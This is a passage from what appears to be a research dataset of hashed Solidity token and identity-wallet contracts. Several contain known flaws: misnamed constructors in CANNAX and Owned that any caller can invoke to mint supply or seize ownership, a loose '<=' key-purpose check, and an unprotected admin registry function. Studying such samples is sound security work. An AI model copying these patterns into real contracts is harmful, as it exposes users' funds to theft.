    }
}

```

## RQ1_e440a75a1c8a

SHA-256 `8c8bea8a68c2abe1aabb669afd84248ebab9e2deb995f12443575ba0440c051b`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract BasicToken is ERC20Basic, Ownable {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  mapping(address => bool) public allowedAddresses;
  mapping(address => bool) public lockedAddresses;
  bool public locked = true;
  function allowAddress(address _addr, bool _allowed) public onlyOwner {
    require(_addr != owner);
    allowedAddresses[_addr] = _allowed;
  }
  function lockAddress(address _addr, bool _locked) public onlyOwner {
    require(_addr != owner);
    lockedAddresses[_addr] = _locked;
  }
  function setLocked(bool _locked) public onlyOwner {
    locked = _locked;
  }
  function canTransfer(address _addr) public constant returns (bool) {
    if(locked){
      if(!allowedAddresses[_addr]&&_addr!=owner) return false;
    }else if(lockedAddresses[_addr]) return false;
    return true;
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(canTransfer(msg.sender));
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract StandardToken is ERC20, BasicToken {
  mapping (address => mapping (address => uint256)) allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(canTransfer(msg.sender));
    uint256 _allowance = allowed[_from][msg.sender];
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = _allowance.sub(_value);
    Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
  function increaseApproval (address _spender, uint _addedValue)
    returns (bool success) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval (address _spender, uint _subtractedValue)
    returns (bool success) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract BurnableToken is StandardToken {
    event Burn(address indexed burner, uint256 value);
    function burn(uint256 _value) public {
        require(_value > 0);
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        Burn(burner, _value);
        Transfer(burner, address(0), _value);
    }
}
contract CANNAX is BurnableToken {
    string public constant name = "Canna Orient";
    string public constant symbol = "CANNAX";
    uint public constant decimals = 18;
    uint256 public constant initialSupply = 1000000000 * (10 ** uint256(decimals));
    function VTTR () {
        totalSupply = initialSupply;
        balances[msg.sender] = initialSupply; 
        allowedAddresses[owner] = true;
    }
}
```

## RQ1_f88fe59a161b

SHA-256 `998128a6389141d51650f1d1ad0d9da2d2ccc4f01de1788c19dfe4f5da31d015`

```solidity
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Owned2() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract ICORP is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    function ICORP() public {
        symbol = "ICORP";
        name = "Corporate Coin";
        decimals = 8;
        _totalSupply = 	6700000000000000;
        balances[0x6100388A3e83A9EF1500Cb76D08048cB5ebaAEc2] = _totalSupply;
        Transfer(address(0), 0x6100388A3e83A9EF1500Cb76D08048cB5ebaAEc2, _totalSupply);
    }
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(msg.sender, to, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        return true;
    }
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(from, to, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }
    function () public payable {
        revert();
    }
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}
```

## RQ1_14d39ae70812

SHA-256 `bb50e222669cbc7ad7b67f7d54e94dbdec1961d7f1e00ba7b75ec826d851ef91`

```solidity
pragma solidity ^0.4.24;
library KeyHolderLibrary {
    event KeyAdded(bytes32 indexed key, uint256 indexed purpose, uint256 indexed keyType);
    event KeyRemoved(bytes32 indexed key, uint256 indexed purpose, uint256 indexed keyType);
    event ExecutionRequested(uint256 indexed executionId, address indexed to, uint256 indexed value, bytes data);
    event ExecutionFailed(uint256 indexed executionId, address indexed to, uint256 indexed value, bytes data);
    event Executed(uint256 indexed executionId, address indexed to, uint256 indexed value, bytes data);
    event Approved(uint256 indexed executionId, bool approved);
    struct Key {
        uint256[] purposes; 
        uint256 keyType; 
        bytes32 key;
    }
    struct KeyHolderData {
        uint256 executionNonce;
        mapping (bytes32 => Key) keys;
        mapping (uint256 => bytes32[]) keysByPurpose;
        mapping (uint256 => Execution) executions;
    }
    struct Execution {
        address to;
        uint256 value;
        bytes data;
        bool approved;
        bool executed;
    }
    function init(KeyHolderData storage _keyHolderData)
        public
    {
        bytes32 _key = keccak256(abi.encodePacked(msg.sender));
        _keyHolderData.keys[_key].key = _key;
        _keyHolderData.keys[_key].purposes.push(1);
        _keyHolderData.keys[_key].keyType = 1;
        _keyHolderData.keysByPurpose[1].push(_key);
        emit KeyAdded(_key, 1, 1);
    }
    function getKey(KeyHolderData storage _keyHolderData, bytes32 _key)
        public
        view
        returns(uint256[] purposes, uint256 keyType, bytes32 key)
    {
        return (
            _keyHolderData.keys[_key].purposes,
            _keyHolderData.keys[_key].keyType,
            _keyHolderData.keys[_key].key
        );
    }
    function getKeyPurposes(KeyHolderData storage _keyHolderData, bytes32 _key)
        public
        view
        returns(uint256[] purposes)
    {
        return (_keyHolderData.keys[_key].purposes);
    }
    function getKeysByPurpose(KeyHolderData storage _keyHolderData, uint256 _purpose)
        public
        view
        returns(bytes32[] _keys)
    {
        return _keyHolderData.keysByPurpose[_purpose];
    }
    function addKey(KeyHolderData storage _keyHolderData, bytes32 _key, uint256 _purpose, uint256 _type)
        public
        returns (bool success)
    {
        require(!keyHasPurpose(_keyHolderData, _key, _purpose), "Key already exists with same purpose"); 
        if (msg.sender != address(this)) {
            require(keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)), 1), "Sender does not have management key"); 
        }
        _keyHolderData.keys[_key].key = _key;
        _keyHolderData.keys[_key].purposes.push(_purpose);
        _keyHolderData.keys[_key].keyType = _type;
        _keyHolderData.keysByPurpose[_purpose].push(_key);
        emit KeyAdded(_key, _purpose, _type);
        return true;
    }
    function addKeys(KeyHolderData storage _keyHolderData, bytes32[] _keys, uint256 _purpose, uint256 _type)
        public
        returns (bool success)
    {
        for (uint16 i = 0; i < _keys.length; i++) {
            addKey(
                _keyHolderData,
                _keys[i],
                _purpose,
                _type
            );
        }
        return true;
    }
    function approve(KeyHolderData storage _keyHolderData, uint256 _id, bool _approve)
        public
        returns (bool success)
    {
        require(keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)), 2), "Sender does not have action key");
        require(!_keyHolderData.executions[_id].executed, "Already executed");
        emit Approved(_id, _approve);
        if (_approve == true) {
            _keyHolderData.executions[_id].approved = true;
            success = _keyHolderData.executions[_id].to.call(_keyHolderData.executions[_id].data, 0);
            if (success) {
                _keyHolderData.executions[_id].executed = true;
                emit Executed(
                    _id,
                    _keyHolderData.executions[_id].to,
                    _keyHolderData.executions[_id].value,
                    _keyHolderData.executions[_id].data
                );
                return;
            } else {
                emit ExecutionFailed(
                    _id,
                    _keyHolderData.executions[_id].to,
                    _keyHolderData.executions[_id].value,
                    _keyHolderData.executions[_id].data
                );
                return;
            }
        } else {
            _keyHolderData.executions[_id].approved = false;
        }
        return true;
    }
    function execute(KeyHolderData storage _keyHolderData, address _to, uint256 _value, bytes _data)
        public
        returns (uint256 executionId)
    {
        require(!_keyHolderData.executions[_keyHolderData.executionNonce].executed, "Already executed");
        _keyHolderData.executions[_keyHolderData.executionNonce].to = _to;
        _keyHolderData.executions[_keyHolderData.executionNonce].value = _value;
        _keyHolderData.executions[_keyHolderData.executionNonce].data = _data;
        emit ExecutionRequested(_keyHolderData.executionNonce, _to, _value, _data);
        if (keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)),1) || keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)),2)) {
            approve(_keyHolderData, _keyHolderData.executionNonce, true);
        }
        _keyHolderData.executionNonce++;
        return _keyHolderData.executionNonce-1;
    }
    function removeKey(KeyHolderData storage _keyHolderData, bytes32 _key, uint256 _purpose)
        public
        returns (bool success)
    {
        if (msg.sender != address(this)) {
            require(keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)), 1), "Sender does not have management key"); 
        }
        require(_keyHolderData.keys[_key].key == _key, "No such key");
        emit KeyRemoved(_key, _purpose, _keyHolderData.keys[_key].keyType);
        uint256[] storage purposes = _keyHolderData.keys[_key].purposes;
        for (uint i = 0; i < purposes.length; i++) {
            if (purposes[i] == _purpose) {
                purposes[i] = purposes[purposes.length - 1];
                delete purposes[purposes.length - 1];
                purposes.length--;
                break;
            }
        }
        if (purposes.length == 0) {
            delete _keyHolderData.keys[_key];
        }
        bytes32[] storage keys = _keyHolderData.keysByPurpose[_purpose];
        for (uint j = 0; j < keys.length; j++) {
            if (keys[j] == _key) {
                keys[j] = keys[keys.length - 1];
                delete keys[keys.length - 1];
                keys.length--;
                break;
            }
        }
        return true;
    }
    function keyHasPurpose(KeyHolderData storage _keyHolderData, bytes32 _key, uint256 _purpose)
        public
        view
        returns(bool result)
    {
        bool isThere;
        if (_keyHolderData.keys[_key].key == 0) {
            return false;
        }
        uint256[] storage purposes = _keyHolderData.keys[_key].purposes;
        for (uint i = 0; i < purposes.length; i++) {
            if (purposes[i] <= _purpose) {
                isThere = true;
                break;
            }
        }
        return isThere;
    }
}
library ClaimHolderLibrary {
    event ClaimAdded(bytes32 indexed claimId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    event ClaimRemoved(bytes32 indexed claimId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    struct Claim {
        uint256 topic;
        uint256 scheme;
        address issuer; 
        bytes signature; 
        bytes data;
        string uri;
    }
    struct Claims {
        mapping (bytes32 => Claim) byId;
        mapping (uint256 => bytes32[]) byTopic;
    }
    function addClaim(
        KeyHolderLibrary.KeyHolderData storage _keyHolderData,
        Claims storage _claims,
        uint256 _topic,
        uint256 _scheme,
        address _issuer,
        bytes _signature,
        bytes _data,
        string _uri
    )
        public
        returns (bytes32 claimRequestId)
    {
        if (msg.sender != address(this)) {
            bytes32 sender = keccak256(abi.encodePacked(msg.sender));
            require(KeyHolderLibrary.keyHasPurpose(_keyHolderData, sender, 1) ||
                    KeyHolderLibrary.keyHasPurpose(_keyHolderData, sender, 3), "Sender does not have claim signer key");
        }
        bytes32 claimId = keccak256(abi.encodePacked(_issuer, _topic));
        if (_claims.byId[claimId].issuer != _issuer) {
            _claims.byTopic[_topic].push(claimId);
        }
        _claims.byId[claimId].topic = _topic;
        _claims.byId[claimId].scheme = _scheme;
        _claims.byId[claimId].issuer = _issuer;
        _claims.byId[claimId].signature = _signature;
        _claims.byId[claimId].data = _data;
        _claims.byId[claimId].uri = _uri;
        emit ClaimAdded(
            claimId,
            _topic,
            _scheme,
            _issuer,
            _signature,
            _data,
            _uri
        );
        return claimId;
    }
    function addClaims(
        KeyHolderLibrary.KeyHolderData storage _keyHolderData,
        Claims storage _claims,
        uint256[] _topic,
        address[] _issuer,
        bytes _signature,
        bytes _data,
        uint256[] _offsets
    )
        public
    {
        uint offset = 0;
        for (uint16 i = 0; i < _topic.length; i++) {
            addClaim(
                _keyHolderData,
                _claims,
                _topic[i],
                1,
                _issuer[i],
                getBytes(_signature, (i * 65), 65),
                getBytes(_data, offset, _offsets[i]),
                ""
            );
            offset += _offsets[i];
        }
    }
    function removeClaim(
        KeyHolderLibrary.KeyHolderData storage _keyHolderData,
        Claims storage _claims,
        bytes32 _claimId
    )
        public
        returns (bool success)
    {
        if (msg.sender != address(this)) {
            require(KeyHolderLibrary.keyHasPurpose(_keyHolderData, keccak256(abi.encodePacked(msg.sender)), 1), "Sender does not have management key");
        }
        emit ClaimRemoved(
            _claimId,
            _claims.byId[_claimId].topic,
            _claims.byId[_claimId].scheme,
            _claims.byId[_claimId].issuer,
            _claims.byId[_claimId].signature,
            _claims.byId[_claimId].data,
            _claims.byId[_claimId].uri
        );
        delete _claims.byId[_claimId];
        return true;
    }
    function getClaim(Claims storage _claims, bytes32 _claimId)
        public
        view
        returns(
          uint256 topic,
          uint256 scheme,
          address issuer,
          bytes signature,
          bytes data,
          string uri
        )
    {
        return (
            _claims.byId[_claimId].topic,
            _claims.byId[_claimId].scheme,
            _claims.byId[_claimId].issuer,
            _claims.byId[_claimId].signature,
            _claims.byId[_claimId].data,
            _claims.byId[_claimId].uri
        );
    }
    function getBytes(bytes _str, uint256 _offset, uint256 _length)
        internal
        pure
        returns (bytes)
    {
        bytes memory sig = new bytes(_length);
        uint256 j = 0;
        for (uint256 k = _offset; k < _offset + _length; k++) {
            sig[j] = _str[k];
            j++;
        }
        return sig;
    }
}
contract ERC725 {
    uint256 constant MANAGEMENT_KEY = 1;
    uint256 constant ACTION_KEY = 2;
    uint256 constant CLAIM_SIGNER_KEY = 3;
    uint256 constant ENCRYPTION_KEY = 4;
    event KeyAdded(bytes32 indexed key, uint256 indexed purpose, uint256 indexed keyType);
    event KeyRemoved(bytes32 indexed key, uint256 indexed purpose, uint256 indexed keyType);
    event ExecutionRequested(uint256 indexed executionId, address indexed to, uint256 indexed value, bytes data);
    event Executed(uint256 indexed executionId, address indexed to, uint256 indexed value, bytes data);
    event Approved(uint256 indexed executionId, bool approved);
    function getKey(bytes32 _key) public view returns(uint256[] purposes, uint256 keyType, bytes32 key);
    function keyHasPurpose(bytes32 _key, uint256 _purpose) public view returns (bool exists);
    function getKeysByPurpose(uint256 _purpose) public view returns(bytes32[] keys);
    function addKey(bytes32 _key, uint256 _purpose, uint256 _keyType) public returns (bool success);
    function removeKey(bytes32 _key, uint256 _purpose) public returns (bool success);
    function execute(address _to, uint256 _value, bytes _data) public returns (uint256 executionId);
    function approve(uint256 _id, bool _approve) public returns (bool success);
}
contract ERC735 {
    event ClaimRequested(uint256 indexed claimRequestId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    event ClaimAdded(bytes32 indexed claimId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    event ClaimRemoved(bytes32 indexed claimId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    event ClaimChanged(bytes32 indexed claimId, uint256 indexed topic, uint256 scheme, address indexed issuer, bytes signature, bytes data, string uri);
    struct Claim {
        uint256 topic;
        uint256 scheme;
        address issuer; 
        bytes signature; 
        bytes data;
        string uri;
    }
    function getClaim(bytes32 _claimId) public view returns(uint256 topic, uint256 scheme, address issuer, bytes signature, bytes data, string uri);
    function getClaimIdsByTopic(uint256 _topic) public view returns(bytes32[] claimIds);
    function addClaim(uint256 _topic, uint256 _scheme, address issuer, bytes _signature, bytes _data, string _uri) public returns (bytes32 claimRequestId);
    function removeClaim(bytes32 _claimId) public returns (bool success);
}
contract KeyHolder is ERC725 {
    KeyHolderLibrary.KeyHolderData keyHolderData;
    constructor() public {
        KeyHolderLibrary.init(keyHolderData);
    }
    function getKey(bytes32 _key)
        public
        view
        returns(uint256[] purposes, uint256 keyType, bytes32 key)
    {
        return KeyHolderLibrary.getKey(keyHolderData, _key);
    }
    function getKeyPurposes(bytes32 _key)
        public
        view
        returns(uint256[] purposes)
    {
        return KeyHolderLibrary.getKeyPurposes(keyHolderData, _key);
    }
    function getKeysByPurpose(uint256 _purpose)
        public
        view
        returns(bytes32[] _keys)
    {
        return KeyHolderLibrary.getKeysByPurpose(keyHolderData, _purpose);
    }
    function addKey(bytes32 _key, uint256 _purpose, uint256 _type)
        public
        returns (bool success)
    {
        return KeyHolderLibrary.addKey(keyHolderData, _key, _purpose, _type);
    }
    function addKeys(bytes32[] _keys, uint256 _purpose, uint256 _type)
        public
        returns (bool success)
    {
        return KeyHolderLibrary.addKeys(keyHolderData, _keys, _purpose, _type);
    }
    function approve(uint256 _id, bool _approve)
        public
        returns (bool success)
    {
        return KeyHolderLibrary.approve(keyHolderData, _id, _approve);
    }
    function execute(address _to, uint256 _value, bytes _data)
        public
        returns (uint256 executionId)
    {
        return KeyHolderLibrary.execute(keyHolderData, _to, _value, _data);
    }
    function removeKey(bytes32 _key, uint256 _purpose)
        public
        returns (bool success)
    {
        return KeyHolderLibrary.removeKey(keyHolderData, _key, _purpose);
    }
    function keyHasPurpose(bytes32 _key, uint256 _purpose)
        public
        view
        returns(bool exists)
    {
        return KeyHolderLibrary.keyHasPurpose(keyHolderData, _key, _purpose);
    }
}
contract ClaimHolder is KeyHolder, ERC735 {
    ClaimHolderLibrary.Claims claims;
    function addClaim(
        uint256 _topic,
        uint256 _scheme,
        address _issuer,
        bytes _signature,
        bytes _data,
        string _uri
    )
        public
        returns (bytes32 claimRequestId)
    {
        return ClaimHolderLibrary.addClaim(
            keyHolderData,
            claims,
            _topic,
            _scheme,
            _issuer,
            _signature,
            _data,
            _uri
        );
    }
    function addClaims(
        uint256[] _topic,
        address[] _issuer,
        bytes _signature,
        bytes _data,
        uint256[] _offsets
    )
        public
    {
        ClaimHolderLibrary.addClaims(
            keyHolderData,
            claims,
            _topic,
            _issuer,
            _signature,
            _data,
            _offsets
        );
    }
    function removeClaim(bytes32 _claimId) public returns (bool success) {
        return ClaimHolderLibrary.removeClaim(keyHolderData, claims, _claimId);
    }
    function getClaim(bytes32 _claimId)
        public
        view
        returns(
            uint256 topic,
            uint256 scheme,
            address issuer,
            bytes signature,
            bytes data,
            string uri
        )
    {
        return ClaimHolderLibrary.getClaim(claims, _claimId);
    }
    function getClaimIdsByTopic(uint256 _topic)
        public
        view
        returns(bytes32[] claimIds)
    {
        return claims.byTopic[_topic];
    }
}
contract managed {
    address public admin;
    constructor() public {
        admin = msg.sender;
    }
    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }
    function transferOwnership(address newAdmin) onlyAdmin public {
        admin = newAdmin;
    }
}
contract WhooseWalletAdmin is managed {
    mapping(address => address) contracts;
    function addContract(address addr) public returns(bool success) {
        contracts[addr] = addr;
        return true;
    }
    function removeContract(address addr) public onlyAdmin returns(bool success) {
        delete contracts[addr];
        return true;
    }
    function getContract(address addr) public view onlyAdmin returns(address addr_res) {
        return contracts[addr];
    }
    function getKey(address _walletAddress, bytes32 _key)
        public view onlyAdmin returns(uint256[] purposes, uint256 keyType, bytes32 key) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.getKey(_key);
    }
    function keyHasPurpose(address _walletAddress, bytes32 _key, uint256 _purpose)
        public view onlyAdmin returns (bool exists) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.keyHasPurpose(_key, _purpose);
    }
    function getKeysByPurpose(address _walletAddress, uint256 _purpose)
        public view onlyAdmin returns(bytes32[] keys) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.getKeysByPurpose(_purpose);
    }
    function addKey(address _walletAddress, bytes32 _key, uint256 _purpose, uint256 _keyType)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.addKey(_key, _purpose, _keyType);
    }
    function addKeys(address _walletAddress, bytes32[] _keys, uint256 _purpose, uint256 _keyType)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.addKeys(_keys, _purpose, _keyType);
    }
    function removeKey(address _walletAddress, bytes32 _key, uint256 _purpose)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.removeKey(_key, _purpose);
    }
    function execute(address _walletAddress, address _to, uint256 _value, bytes _data)
        public onlyAdmin returns (uint256 executionId) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.execute(_to, _value, _data);
    }
    function approve(address _walletAddress, uint256 _id, bool _approve)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.approve(_id, _approve);
    }
    function getClaim(address _walletAddress, bytes32 _claimId)
        public onlyAdmin view returns(uint256 topic, uint256 scheme, address issuer, bytes signature, bytes data, string uri) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.getClaim(_claimId);
    }
    function getClaimIdsByTopic(address _walletAddress, uint256 _topic)
        public onlyAdmin view returns(bytes32[] claimIds) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.getClaimIdsByTopic(_topic);
    }
    function addClaim(address _walletAddress, uint256 _topic, uint256 _scheme, address issuer, bytes _signature, bytes _data, string _uri)
        public onlyAdmin returns (bytes32 claimRequestId) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.addClaim(_topic, _scheme, issuer, _signature, _data, _uri);
    }
    function removeClaim(address _walletAddress, bytes32 _claimId)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        return _wallet.removeClaim(_claimId);
    }
    function kill(address _walletAddress)
        public onlyAdmin returns (bool success) {
        WhooseWallet _wallet = WhooseWallet(_walletAddress);
        _wallet.destruct();
        return true;
    }
}
contract WhooseWallet is ClaimHolder {
    address whooseWalletAdminAddress = 0x6babebb9657257F83492D457E7f41B2524368dE6;
    constructor() public {
        bytes32 _admin = keccak256(abi.encodePacked(whooseWalletAdminAddress));
        addKey(_admin, 1, 1);
        WhooseWalletAdmin _walletAdmin = WhooseWalletAdmin(whooseWalletAdminAddress);
        _walletAdmin.addContract(address(this));
    }
    function destruct() public {
        if (msg.sender != address(this) && whooseWalletAdminAddress != address(this)) {
            bytes32 sender = keccak256(abi.encodePacked(msg.sender));
            require(KeyHolderLibrary.keyHasPurpose(keyHolderData, sender, 1), "Sender does not have management key");
        }
        selfdestruct(whooseWalletAdminAddress);
    }
}
```

## RQ1_ed250fd054c9

SHA-256 `b9850f53474a11dbdbc3640d7631f4d41749dd1a8cea81338e0e844eab10727c`

```solidity
pragma solidity ^0.4.18;
contract SafeMath {
  function mulSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
       return 0;
     }
     uint256 c = a * b;
     assert(c / a == b);
     return c;
   }
  function divSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a / b;
     return c;
  }
  function subSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
     return a - b;
   }
  function addSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a + b;
    assert(c >= a);
     return c;
   }
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Constructor() public { owner = msg.sender; }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract ERC20 {
   uint256 public totalSupply;
   function balanceOf(address who) public view returns (uint256);
   function transfer(address to, uint256 value) public returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
   function allowance(address owner, address spender) public view returns (uint256);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
   function approve(address spender, uint256 value) public returns (bool);
   event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}
contract ERC223ReceivingContract { 
    function tokenFallback(address _from, uint _value, bytes _data) public;
}
contract StandardToken is ERC20, ERC223, SafeMath, Owned {
  event ReleaseSupply(address indexed receiver, uint256 value, uint256 releaseTime);
  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    balances[msg.sender] = subSafe(balances[msg.sender], _value);
    balances[_to] = addSafe(balances[_to], _value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
   }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = subSafe(balances[_from], _value);
     balances[_to] = addSafe(balances[_to], _value);
     allowed[_from][msg.sender] = subSafe(allowed[_from][msg.sender], _value);
    Transfer(_from, _to, _value);
     return true;
   }
   function approve(address _spender, uint256 _value) public returns (bool) {
     allowed[msg.sender][_spender] = _value;
     Approval(msg.sender, _spender, _value);
     return true;
   }
  function allowance(address _owner, address _spender) public view returns (uint256) {
     return allowed[_owner][_spender];
   }
   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
     allowed[msg.sender][_spender] = addSafe(allowed[msg.sender][_spender], _addedValue);
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
     uint oldValue = allowed[msg.sender][_spender];
     if (_subtractedValue > oldValue) {
       allowed[msg.sender][_spender] = 0;
     } else {
       allowed[msg.sender][_spender] = subSafe(oldValue, _subtractedValue);
    }
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
    function transfer(address _to, uint _value, bytes _data) public {
        require(_value > 0 );
        if(isContract(_to)) {
            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        balances[msg.sender] = subSafe(balances[msg.sender], _value);
